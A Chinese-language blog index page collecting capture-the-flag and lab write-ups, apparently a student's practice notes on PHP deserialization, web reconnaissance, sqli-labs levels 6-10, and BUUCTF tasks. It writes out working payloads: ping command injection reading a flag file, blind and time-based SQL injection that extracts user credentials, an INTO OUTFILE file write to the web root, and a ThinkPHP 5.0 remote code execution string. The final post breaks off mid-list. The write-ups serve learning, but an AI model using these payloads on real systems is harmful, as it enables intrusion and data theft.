<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>baba童鞋的博客</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="baba童鞋的博客">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="baba童鞋的博客">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Jialu">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/huahua.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/huahua.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-web" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/13/web/" class="article-date">
  	<time datetime="2021-03-13T07:59:05.000Z" itemprop="datePublished">2021-03-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/13/web/">
        攻防世界练习
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>simp_php</h1>

<p>题目如下：<br><img src="/2021/03/13/web/q1.png"><br>根据题目可知，flag1==0且a不为0；想得到flag2，b不为数字或字符串，is_numeric() 函数用于检测变量是否为数字或数字字符串。<br>最终<br>payload:?a=0a&amp;b=123456%00;<br><img src="/2021/03/13/web/q2.png"><br>得到flag！</p>
<h1>Get Post</h1>

<p>题目：<br><img src="/2021/03/13/web/a1.png"><br>根据提示，get传入?a=1<br>在根据提示post传入b=2<br><img src="/2021/03/13/web/a2.png"><br>euuuu好简单，是我的打开方式不对/??</p>
<h1>xff_referer</h1>

<p>题目显示ip地址必须为123.123.123<br>采用bp抓包：<br>X-Forwarded-For: 123.123.123.123<br>提示说必须来自<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br>Referer: <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br>得到flag！</p>
<h1>webshell</h1>

<p>打开题目，一句话木马，才一年采用蚁剑<br><img src="/2021/03/13/web/11.png"><br>点击添加的地址，进入之后<br><img src="/2021/03/13/web/222.png"><br>得到flag！</p>
<h1>command_execution</h1>

<p>打开题目：<br><img src="/2021/03/13/web/p1.png"><br>ping!!<br>连接本机127.0.0.1<br><img src="/2021/03/13/web/p2.png"><br>成功回显，试试其他命令127.0.0.1 &amp;&amp; ls<br>可以执行，那么我们直接<br><img src="/2021/03/13/web/1.png"><br>127.0.0.1 &amp;&amp; cat /home/flag.txt<br><img src="/2021/03/13/web/2.png"><br>得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-fan" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/10/fan/" class="article-date">
  	<time datetime="2021-03-10T11:59:14.000Z" itemprop="datePublished">2021-03-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/10/fan/">
        反序列化&amp;web信息搜集知识点总结
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>反序列化</h1>

<p><b style="color:red">反序列化定义：</b><br>（反）序列化给我们传递对象提供了一种简单的方法。serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，在PHP应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。在php序列化格式（即数据在传输时防止格式类型丢失,先进行打包即序列化,完成传输后解包即反序列化）<br><b style="color:yellow">反序列化原型：</b>string serialize ( mixed $value )<br><b style="color:pink">例子：</b><br>输入内容：<br><img src="/2021/03/10/fan/q1.png"><br>输出结果：<br><img src="/2021/03/10/fan/q2.png"><br>序列化对不同格式字符串结果不同，如下：</p>
<ul>
<li>
string:s:size:value
</li><li>
integer:i:value
</li><li>
boolean:b:value(即0或1)
</li><li>
array:a:size:{key:value;key:value}
</li><li>
object:o:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;}
</li></ul>

<p>注：序列化对象时，不会保存常量的值。对于父类中的变量，则会保留。<br><b style="color:blue">反序列化函数：</b>mixed unserialize ( string $str )<br>unserialize()反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</p>
<ul>
<li>如果传递的字符串不可解序列化，则返回 FALSE，并产生一个E_NOTICE
</li><li>返回的是转换之后的值，可为integer``float、string、array或object
</li><li>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用__wakeup()成员函数（如果存在的话）
</li></ul>

<p><b style="color:pink">例子：</b><br>输入内容：<br><img src="/2021/03/10/fan/q3.png"><br>输出结果：<br><img src="/2021/03/10/fan/q4.png"><br>__wakeup()函数在对象被构建以后执行，所以$this-&gt;username的值不为空(为空则会绕过此函数，或反序列化时数据被改动也会绕过）<br>会尽量将变量值进行匹配并复制给序列化后的对象<br><b style="color:yellow">&gt;常见的PHP魔术方法：</b></p>
<ul>
<li>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。
</li><li>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。
</li><li>__toString：当对象被当做一个字符串使用时调用。
</li><li>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)
</li><li>__wakeup:反序列化恢复对象之前调用该方法
</li><li>__call:当调用对象中不存在的方法会自动调用该方法。
</li><li>__get:在调用私有属性的时候会自动执行
</li><li>__isset()在不可访问的属性上调用isset()或empty()触发
</li><li>__unset()在不可访问的属性上使用unset()时触发
</li></ul>

<p><b style="color:red">php反序列化漏洞：</b><br>php反序列化漏洞又称对象注入，可能会导致注入，远程代码执行等安全问题的发生。</p>
<p>PHP反序列化漏洞产生的原因：</p>
<p>如果一个php代码使用了unserialize函数去调用某一类，该类中会自动执行一些<br>自定义的magic method，这些magicmethod中如果包含了一些危险操作，或者这<br>些magic method会去调用类中其他危险操作的函数，如果这些危险操作是我们可<br>控的，那么久可以进行一些不可描述的操作了。</p>
<p><b style="color:green">总结：</b><br>当存在php反序列化漏洞时，找一个可控的反序列化函数，通过这个函数去调用一些类，在这些类中可能存在一些魔法函数，在这些魔法函数中可能有一些我们可控的危险操作，我们利用这些危险操作，让程序执行反序列化函数时触发这些的危险操作。</p>
<h1>web信息收集</h1>

<p><b style="color:pink">敏感目录</b><br><b style="color:pink">git泄露</b><br>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p>
<p>1、常规git泄露</p>
<p>使用scrabble或者其他工具读出源码即可<br>./scrabble <a href="http://example.com/">http://example.com/</a></p>
<p>2、git回滚<br>git会记录每次的提交的修改，在比赛中拿到的flag文件有可能是被删除或者覆盖过的，这时可以利用git reset –hard HEAD^来恢复到以前的版本<br>也可以用git log –stat查看commit修改了哪些文件，再用git diff HEAD commit-id</p>
<p>3、git分支<br>每次提交git都会将她们串为一条时间线，这条时间线就是一条分支，git允许有多条分支，则需要的flag文件有可能不在主分支即master上，而 git log只能看到当前分支的。<br>对于获取其他的分支、tag，都可以从/.git/refs/heads、/.git/refs/tag里面拿到最新的commit对象id，然后就是顺着这个可以爬到parent commit<br>假设获取master，最新的commit的object id可以在/.git/refs/heads/master获取到</p>
<p>4、其他利用方式<br>从.git/config可能有access_token信息， 从而访问这个用户的其他的仓库<br>在访问.git的时候有可能会返回403，此时可以试着访问.git/config，若有文件返回则有可能存在泄露。</p>
<p><b style="color:pink">SVN泄露</b><br>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn/entries文件，获取到服务器源码。<br>可以用seay-svn或者dvcs-ripper工具获取</p>
<p><b style="color:pink">HG泄露</b><br>Mercurial 是一种轻量级分布式版本控制系统，使用hg init的时候会生成.hg。<br>漏洞利用工具： dvcs-ripper</p>
<p><b style="color:pink">敏感备份文件</b><br>通过敏感备份文件，有可能能获得一些源码</p>
<p>1、gedit</p>
<p>Linux下用gedit编写文件并保存后会生成一个文件名格式为：”原文件名~“的备份文件</p>
<p>2、vim</p>
<p>当使用vim编辑文件第一次意外退出时会生成一个文件名格式为：“.文件名.swp”的备份文件，可使用vim -r 文件名来恢复</p>
<p>第二次意外退出*.swo，第三次为*.swn</p>
<p>3、常规文件</p>
<p>【1】robots.txt:敏感目录和CMS版本信息<br>【2】readme.md:CMS版本信息，github地址<br>【3】格式如<a target="_blank" rel="noopener" href="http://www.zip/rar/tar.gz:%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%BA%90%E7%A0%81">www.zip/rar/tar.gz:网站备份源码</a><br><b style="color:pink">Banner识别</b><br>1、利用CMS指纹库<br>2、在线识别<br>3、利用已有工具wappalyer，可以通过python安装库，也可以在浏览器装插件<br>4、还可以通过报错404和302来查看错误信息</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-mz" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/26/mz/" class="article-date">
  	<time datetime="2021-02-26T05:52:18.000Z" itemprop="datePublished">2021-02-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/26/mz/">
        sqli-labs靶场8-10
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>知识点</h1>

<p>函数</p>
<ul>
<li>length()函数                返回字段/结果/函数的长度，length(column_name)
</li><li>length(database())            即返回当前数据库名长度
</li><li>substr()函数             截取字符段长度
</li><li>例如：substr（abcd，1，1） 从第一位开始（也就是从a开始）截取一个字符，就是a
</li><li>  substr（abcd，2，1）     从第二位开始，截取一个字符，就是b
</li><li>substr（abcd，2，3）       从第二位开始，截取三个字符，就是bcd
</li><li>if()函数                条件判断函数
</li><li>if(a,b,c)      if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;
</li><li>sleep()函数            网页延迟n秒后，输出结果
</li><li>left（）函数             从左边数，取几个数
</li><li>例如：left（abcdef，3）  取3位左边的数，就是abc
</li></ul>

<p><img src="/2021/02/26/mz/b1.png"></p>
<h1>Less-8（基于布尔的盲注）</h1>

<p><b style="color:pink">基于布尔的盲注：</b><br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>$result=mysql_query($sql);<br>$row = mysql_fetch_array($result);<br>if($row){<br>      echo ‘You are in………..’;<br>}else{<br>}<br><b style="color:pink">payload:</b></p>
<ol>
<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115--+
</li><li>Less-8/?id=1' and (length(database())) = 8 --+ //数库名长度=8
</li></ol>

<p><b style="color:pink">盲注得到数据库名：security</b></p>
<ol>
<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,3,1))) = 99 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,4,1))) = 117 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,5,1))) = 114 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,6,1))) = 105 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,7,1))) = 116 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,8,1))) = 121 --+  
</li></ol>

<p><b style="color:pink">接着判断表名长度：</b><br>Less-8/?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 –+<br><b style="color:pink">接下来判断表名为user：</b><br>?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) = 5 –+</p>
<ol>
<li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) = 117 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,2,1))) = 115 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,3,1))) = 101 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,4,1))) = 114 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,5,1))) = 115 --+
</li></ol>

<p>其余的用同样的盲注方法得到结果</p>
<h1>Less-9（基于时间盲注1）</h1>

<p><b style="color:purple">一、判断注入点</b><br>?id=1’)and (sleep(4)) –+ （耗时2s，这是正常的页面，没有闭合的页面）<br>?id=1’and (sleep(4)) –+ （耗时6s，因为正常页面需要2s，所以闭合之后消耗的时间为又增加了4s，所以是6s）<br>时间注入判断注入点就用这个<br>由于不报错，所以判断注入点，就是用sleep延迟函数<br>根据第8关的思想我们先判断数据库的长度</p>
<ul>
<li>?id=1' and if (length(database()) = 8 ,sleep(4),1)--+
</li></ul>

<p>数据库的长度为8，就延时反应4秒<br>知道了数据库的长度，那么我们就进行爆库;<br>?id=1’ and If(ascii(substr(database(),1,1))=115,sleep(5),1)–+<br>说明第一位是 s （ascii 码是 115）<br>?id=1’ and If(ascii(substr(database(),2,1))=101,sleep(5),1)–+<br>说明第一位是 e （ascii 码是 101）<br><b style="color:purple">二、爆表名</b><br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(4),1)–+ （u）<br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),2,1))=115,sleep(4),1)–+ （s）<br>以此类推<br>————————————————<br>?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=’users’ and table_schema=database() limit 0,1),1,1))=105,sleep(4),1)–+</p>
<p>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password<br><b style="color:purple">三、爆数据</b><br>?id=1’ and If(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(4),1)–+<br>以此类推，我们得到数据库 username，password 的所有内容</p>
<h1>Less-10（基于时间盲注2）</h1>

<p>和第九关一样，基于时间盲注的注入<br>双引号注入：<br>系统的来判断一下注入点</p>
<ul>
<li>?id=1" and (sleep(3))--+  （有延迟）
</li><li>?id=1’ and (sleep(3))--+   (无延迟)
</li></ul>

<p>接下来和第九关步骤一样，得到想要的内容</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-bc" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/22/bc/" class="article-date">
  	<time datetime="2021-02-22T05:11:15.000Z" itemprop="datePublished">2021-02-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/22/bc/">
        sqli-labs靶场6-7
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>知识点</h1>
<h3>outfile语句</h3>

<p>这里需要注意的是outfile语句在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。<br>（1）secure_file_priv<br>这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；如果这个参数为空，那么导入导出的文件位置将不受限制。<br>该参数的设置，可以在my.cnf配置文件中修改，而在搭建的SQLi-Labs环境中下需要在配置的phpstudy环境中修改，具体修改方法因配置环境而异，此处不作讲解。<br>（2）datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径<br>（3）PrivateTmp<br>使用Systemd进程作为启动进程的linux系统，其子进程都会有一个属性叫PrivateTmp，用于设置是否使用私有的tmp目录。</p>
<h1>Less-6</h1>
<h3>界面</h3>

<p><img src="/2021/02/22/bc/b1.png"></p>
<h3>测试</h3>

<p>通过测试可知：?id=1”<br><img src="/2021/02/22/bc/b2.png"></p>
<ul>
<li>url + ?id=1" order by 4--+ //报错
</li></ul>

<p><img src="/2021/02/22/bc/b3.png"><br>可知字段数为3，页面有布尔类型状态，所以用布尔盲注，页面没有回显不能用联合查询，页面没有报错信息不能用报错注入。<br>其余步骤和第五关的一模一样，只是将单引号变为双引号<br>最终payload：?id=1” and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))–+<br>得到所有数据：<br><img src="/2021/02/22/bc/b4.png"></p>
<h1>Less-7</h1>
<h3>界面</h3>

<p><img src="/2021/02/22/bc/c1.png"></p>
<h3>测试</h3>

<p>首先，按照提示输入id参数，尝试寻找注入点<br>构建url: …/Less-7/?id=1<br><img src="/2021/02/22/bc/c2.png"><br>页面显示正常，提示使用outfile语句<br>构建url：…/Less-7/?id=1’<br><img src="/2021/02/22/bc/c3.png"><br>页面报错，但是没有提示报错信息,网站存在注入点,通过不断尝试，我们猜测到了原有sql语句的闭合方式<br>构建url：…/Less-7/?id=1’)) –+<br>页面显示正常<br>那么可以使用union联合查询构造语句：</p>
<ul>
<li>../Less-7/?id=1")) union select 1,2,3 --(( "
</li></ul>

<p>此时的查询语句；select * from users where id=((‘1’)) union select 1,2,3 –(( ‘)<br>在linux中，网站一般是放在/var/www/html目录里，这里我们dump一个文件到这个目录，名字是hacker.txt。<br>构造语句：</p>
<ul>
<li>../Less-7/?id=1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
</li></ul>

<p><img src="/2021/02/22/bc/c4.png"><br>虽然报错，但是文件已经生成</p>
<p>打开链接：</p>
<p>…/hacker.txt即可找到</p>
<p>此时的sql语句为：</p>
<ul>
<li>select * from users where id=(('1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
</li></ul>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hack" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/15/hack/" class="article-date">
  	<time datetime="2021-02-15T11:56:57.000Z" itemprop="datePublished">2021-02-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/15/hack/">
        25-buu练习[BJDCTF 2nd]old-hack 1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>知识点</h2>
<h3>ThinkPHP</h3>

<p><b>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。由于其简单易用，国内用户众多。</b><br>2019年1月11日ThinkPHP团队发布了版本更新，本次更新包含了一个可能GetShell的安全更新，具体内容为改进Request类的method方法。<br><b style="color:pink">漏洞描述</b><br>Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。<br><b style="color:pink">漏洞危害</b><br>在未经授权的情况下远程攻击者构造特殊的请求可以在PHP上下文环境中执行任意系统命令，甚至完全控制网站，造成数据泄露，网站内容被修改。<br><b style="color:pink">影响范围</b><br>受影响版本：ThinkPHP 5.0.x<br>不受影响版本：ThinkPHP 5.0.24<br>在修复前的文件526行中，当存在$_POST[‘_method’]变量是将会执行 $this-&gt;{$this-&gt;method}($_POST)，当$_POST[‘_method’]为__construct时及等价于调用$this-&gt;_construct($_POST)_construct函数实现如下：<br><b style="color:pink">漏洞分析</b><br>在该函数中，当传入的参数中的key为该Requests属性，将value赋值给该属性，由于key可控制，可以到达属性覆盖的效果。<br><b style="color:pink">漏洞复现</b><br>通过git 可以快速搭建环境</p>
<ul>
<li>git clone https://github.com/top-think/think
</li><li>
git checkout v5.0.23
</li><li>
cd think
</li><li>
git clone https://github.com/top-think/framework thinkphp
</li><li>
cd thinkphp
</li><li>
git checkout v5.0.23
</li></ul>

<p>通过覆盖filter属性即可达到调用任意函数的效果。<br>Payload如下</p>
<ul>
<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami
</li></ul>

<p>在早期5.0的版本过滤器的调用有差别payload也会不同<br>更详细内容参见；<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11460285.html">https://www.cnblogs.com/yuzly/p/11460285.html</a></p>
<h2>题目</h2>

<p>打开靶场<br><img src="/2021/02/15/hack/g0.png"><br>题目提示是thinkphp5<br>百度发现thinkphp5有原厂命令执行漏洞，详情在知识点中有多描述<br>构造payload：</p>
<ul>
<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
</li></ul>

<p><img src="/2021/02/15/hack/g.png"><br>得到flag~~</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-guge" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/14/guge/" class="article-date">
  	<time datetime="2021-02-14T07:45:30.000Z" itemprop="datePublished">2021-02-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/14/guge/">
        24-buu练习[BJDCTF 2nd]fake google 1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>知识点</h2>

<p><b style="color:pink">Tornado和Jinja2</b>，这两个都是以两组花括号作为变量包裹标识符：<br><img src="/2021/02/14/guge/g3.png"></p>
<ul>
<li>利用漏洞命令执行或者信息泄露，信息泄露有一些敏感的配置信息，而命令执行就能很直观的进行操作。例如文件读写。
</li><li>然后是确定如何操作，查看可用模块里可执行函数，比如os.system可以执行系统命令，os.popen()可以读取文件等。
</li><li>再就是对题目的过滤进行绕过。可能会对某些危险函数禁用或者过滤函数名。可用编码、拼接，替换等方式绕过。
</li></ul>

<p>有关ssti的payload：<br><img src="/2021/02/14/guge/g7.png"><br>相关函数的解释:</p>
<ul>
<li>__class__ 返回类型所属的对象
</li><li>__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
</li><li>__init__ 类的初始化方法
</li><li>__globals__ 对包含函数全局变量的字典的引用
</li><li>__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
<li.__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块 < ul>
<h2>题目</h2>

<p>题目出来后，是一个搜索页面，f12也没什么发现，在搜索框输入1：<br><img src="/2021/02/14/guge/g1.png"><br>搜索后出现以下内容：<br><img src="/2021/02/14/guge/g2.png"><br>ssti模板注入，又是崭新的东西=……=|||，虽然前面做过了一题tornado模板的，但是差别很大，我太难了||||<br>既然是ssti模板注入，尝试一下，比如说，在搜索框中输入4，会显示4 ，说明后端有处理渲染。<br>用下面的流程图测试一下，看看是什么模板引擎：<br><img src="/2021/02/14/guge/g4.png"><br>用Payload测试之后发现是jinjia2的模板引擎，然后构造jinjia2 ssti的命令执行payload：<br><img src="/2021/02/14/guge/g5.png"><br><img src="/2021/02/14/guge/g6.png"><br>的到flag！~<br>这道题是真的不知道是个什么情况=….=，看大佬博客也搞不清楚状况，只能这样了<br>参考：<br>SSTI模板注入参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">https://www.jianshu.com/p/aef2ae0498df</a><br>ssti/沙盒逃逸详细总结：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172#h2-13">https://www.anquanke.com/post/id/188172#h2-13</a><br>服务段模板注入攻击：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p>
</li.__bases__></li></ul>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-list" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/12/list/" class="article-date">
  	<time datetime="2021-02-12T09:17:13.000Z" itemprop="datePublished">2021-02-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/12/list/">
        23-buu练习[GYCTF2020]Blacklist
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>知识点</h2>

<p>一、堆叠注入<br>查表名、列名、字段名</p>
<ol>
<li>show databases;
</li><li>show tables;
</li><li>show columns from `table_name`;
</li></ol>

<p>二、本题使用HANDLER查看flag</p>
<ol>
<li>1';
</li><li>handler FlagHere open;
</li><li>handler FlagHere read first;
</li><li>handler FlagHere close;#
</li></ol>

<p>三、HANDLER<br>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
<ul>
<li>HANDLER tbl_name OPEN [ [AS] alias]
</li><li>HANDLER tbl_name READ index_name { = | <= |>= | < | > } (value1,value2,...)
<li>    [ WHERE where_condition ] [LIMIT ... ]
</li><li>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
</li><li>    [ WHERE where_condition ] [LIMIT ... ]
</li><li>HANDLER tbl_name READ { FIRST | NEXT }
</li><li>    [ WHERE where_condition ] [LIMIT ... ]
</li><li>HANDLER tbl_name CLOSE 
</li><li>//其中  HANDLER tbl_name OPEN AS example
</li><li>//其后  HANDLER example READ index_name="example2"
</li></=></li></ul>

<p>四、预处理语句使用方法</p>
<ol>
<li>PREPARE name from '[my sql sequece]';   //预定义SQL语句
</li><li>EXECUTE name;  //执行预定义SQL语句
</li><li>(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
</li></ol>
<ol>
<li>SET @tn = 'hahaha';  //存储表名
</li><li>SET @sql = concat('select * from ', @tn);  //存储SQL语句
</li><li>PREPARE name from @sql;   //预定义SQL语句
</li><li>EXECUTE name;  //执行预定义SQL语句
</li><li>(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
